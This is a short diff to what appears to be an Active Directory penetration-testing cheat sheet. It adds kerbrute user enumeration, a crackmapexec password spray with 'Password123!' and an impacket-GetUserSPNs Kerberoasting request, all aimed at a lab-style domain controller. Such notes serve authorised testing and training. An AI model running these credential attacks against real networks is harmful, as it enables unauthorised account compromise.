@@ -43,6 +43,10 @@ cme smb <target> --shares -u <user> -p <password>
 cme ldap <target> --get-sid
 
 
+kerbrute userenum --dc 192.168.10.10 -d MARVEL.local users.txt
+crackmapexec smb 192.168.10.10 -u spray.txt -p 'Password123!'
+impacket-GetUserSPNs MARVEL.local/tstark:User@123 -dc-ip 192.168.10.10 -request
+
 
 smbclient -L //192.168.10.101
 
